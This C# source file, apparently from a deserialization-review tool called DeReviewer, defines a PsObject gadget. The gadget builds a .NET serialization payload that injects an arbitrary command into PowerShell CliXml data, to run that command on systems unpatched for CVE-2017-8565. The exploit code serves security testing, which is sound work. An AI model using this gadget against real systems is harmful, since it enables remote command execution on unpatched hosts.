using System;
using System.IO;
using System.Management.Automation;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace DeReviewer.KnowledgeBase.Gadgets
{
  //  PsObject Gadget by Alvaro Munoz and Oleksandr Mirosh.
  //  Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)
  internal class PsObject : IGadget
  {
    public object Build(string command)
    {
      string clixmlData = File.ReadAllText(@"Payloads\PsObject.clixml")
        .Replace("%CMD%", command);

      return new PsObjectMarshal(clixmlData);
    }
  }

  [Serializable]
  internal class PsObjectMarshal : ISerializable
  {
    private readonly string clixmlData;

    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
      Type typePso = typeof(PSObject);
      info.SetType(typePso);
      info.AddValue("CliXml", clixmlData);
    }

    public PsObjectMarshal(string clixmlData)
    {
      this.clixmlData = clixmlData;
    }
  }
}
